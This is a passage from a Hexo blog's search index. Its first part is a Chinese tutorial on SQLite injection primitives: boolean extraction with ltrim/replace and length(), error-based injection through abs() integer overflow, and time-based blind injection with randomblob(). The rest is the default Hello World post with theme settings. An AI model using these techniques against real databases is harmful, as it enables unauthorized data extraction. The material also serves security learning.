class="language-cookie">sqlite>  .load /usr/lib/sqlite3/pcre.so</code></pre><p>语句类似mysql不说了</p><h4 id="GLOB"><a href="#GLOB" class="headerlink" title="GLOB"></a>GLOB</h4><p>类似<code>like</code>，不过用的是unix的 * ?</p><pre class=" language-cookie"><code class="language-cookie">select 'abc' GLOb 'a*'; 'abc' GLOb 'a*'---------------1          </code></pre><h4 id="nullif-和-instr"><a href="#nullif-和-instr" class="headerlink" title="nullif 和 instr()"></a>nullif 和 instr()</h4><p>instr(a,b) 返回 b第一次出现在a的地方 ，</p><p>和<code>nullif()</code>一起用 如果是出现在<code>1</code>就返回null</p><pre class=" language-cookie"><code class="language-cookie">select nullif(instr('abca','z'),1); //0 </code></pre><p>如果没有匹配到会返回<code>0</code>,这就和null一样效果</p><p>为了防止这种情况，在后面加上 <code>||1</code> 拼接字符串</p><pre class=" language-cookie"><code class="language-cookie">select nullif(instr('abca','b'),1)||1; // 21select nullif(instr('abca','a'),1)||1;  //nullselect nullif(instr('abca','ab'),1)||1; //null</code></pre><h4 id="利用-ltrim-和length-注入"><a href="#利用-ltrim-和length-注入" class="headerlink" title="利用 ltrim() 和length() 注入"></a>利用 ltrim() 和length() 注入</h4><p>使用<code>length()</code>获取字段的长度</p><pre class=" language-cookie"><code class="language-cookie">select length("vote")=4;</code></pre><pre class=" language-cookie"><code class="language-cookie">sqlite> select length(ltrim("vote","vo"))=2;</code></pre><p>然后<code>ltrim()</code> 函数从左往右爆破字符串，</p><p>如果爆破的字符串正确，那么length就会减少</p><h4 id="同理-rtrim-trim-和-length"><a href="#同理-rtrim-trim-和-length" class="headerlink" title="同理 rtrim()/trim()和 length()"></a>同理 rtrim()/trim()和 length()</h4><h4 id="replace-和length-注入"><a href="#replace-和length-注入" class="headerlink" title="replace()和length()注入"></a>replace()和length()注入</h4><p>最好前面有标识符号，<code>flag{</code> 这样<br>和 ltrim 和 rtrim类似<br>不然麻烦</p><pre class=" language-cookie"><code class="language-cookie">select  length(replace('flag{aza}','flag{a',''))=3;//1 select length(replace('flag{aza}','flag{b',''))=3;//0</code></pre><h4 id="ltrim-和-length-和nullif"><a href="#ltrim-和-length-和nullif" class="headerlink" title="ltrim() 和 length()和nullif()"></a>ltrim() 和 length()和nullif()</h4><pre class=" language-cookie"><code class="language-cookie">select nullif(length(ltrim("vote","vo")),2);</code></pre><p>nullif 和 length 和ltrim 配合</p><p>如果 正确返回<code>null</code></p><h4 id="case-when-then-else-end"><a href="#case-when-then-else-end" class="headerlink" title="case when then else end"></a>case when then else end</h4><pre class=" language-cookie"><code class="language-cookie">select CASE  WHEN  1=1 THEN 1 ELSE 0 END ;//1select CASE  WHEN  1=2 THEN 1 ELSE 0 END ; //0</code></pre><h4 id="利用abs-报错，ifnull-nullif"><a href="#利用abs-报错，ifnull-nullif" class="headerlink" title="利用abs()报错，ifnull(),nullif()"></a>利用abs()报错，ifnull(),nullif()</h4><ul><li><p>ifnull可以用<code>coalesce()</code>函数代替</p></li><li><p><code>abs()</code>函数存在整形溢出</p></li><li><p>当abs()参数是<code>-9223372036854775808</code>也就是<code>0x8000000000000000</code><br>就会报错</p><pre class=" language-cookie"><code class="language-cookie">sqlite> select abs(0x99999999999999999);Error: hex literal too big: 0x99999999999999999</code></pre><p>所以基于报错的注入：</p></li></ul><p>通过nullif和ifnull来决定是否报错<br>如果 <code>1=1</code> 就报错</p><pre class=" language-cookie"><code class="language-cookie">select abs(ifnull(nullif(1,1),0x8000000000000000));Error: integer overflowselect abs(ifnull(nullif(1,2),0x8000000000000000));2</code></pre><h3 id="时间盲注-randomblob"><a href="#时间盲注-randomblob" class="headerlink" title="时间盲注 randomblob()"></a>时间盲注 randomblob()</h3><p>randomblob(n)可以产生n长度的字符串，足够长就可以延时</p><pre class=" language-cookie"><code class="language-cookie">select case when substr('abc',1,1)='a' then randomblob(1000000) else 0 end;</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2020/02/10/hello-world/"/>
      <url>/2020/02/10/hello-world/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class=" language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class=" language-bash"><code class="language-bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class=" language-bash"><code class="language-bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class=" language-bash"><code class="language-bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p><p>##写文章</p><pre><code>---title: typora-vue-theme主题介绍date: 2018-09-07 09:25:00author: 赵奇img: /source/images/xxx.jpgtop: truecover: truecoverImg: /images/1.jpgpassword: 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92toc: falsemathjax: falsesummary: 这是你自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要categories: Markdowntags:  - Typora  - Markdown---</code></pre><pre class=" language-$xslt"><code class="language-$xslt">title    Markdown 的文件标题    文章标题，强烈建议填写此选项date    文件创建时的日期时间    发布时间，强烈建议填写此选项，且最好保证全局唯一author    根 _config.yml 中的 author    文章作者img    featureImages 中的某个值    文章特征图，推荐使用图床(腾讯云、七牛云、又拍云等)来做图片的路径.如: http://xxx.com/xxx.jpgtop    true    推荐文章（文章是否置顶），如果 top 值为 true，则会作为首页推荐文章cover    false    v1.0.2版本新增，表示该文章是否需要加入到首页轮播封面中coverImg    无    v1.0.2版本新增，表示该文章在首页轮播封面需**要显示的图片路径，如果没有，则默认使用文章的特色图片password    无    文章阅读密码，如果要对文章设置阅读验证密码的话，就可以设置 password 的值，该值必须是用 SHA256 加密后的密码，防止被他人识破。前提是在主题的 config.yml 中激活了 verifyPassword 选项toc    true    是否开启 TOC，可以针对某篇文章单独关闭 TOC 的功能。前提是在主题的 config.yml 中激活了 toc 选项mathjax    false    是否开启数学公式支持 ，本文章是否开启 mathjax，且需要在主题的 _config.yml 文件中也需要开启才行summary    无    文章摘要，自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要categories    无    文章分类，本主题的分类表示宏观上大的分类，只建议一篇文章一个分类tags    无    文章标签，一篇文章可以多个标签</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
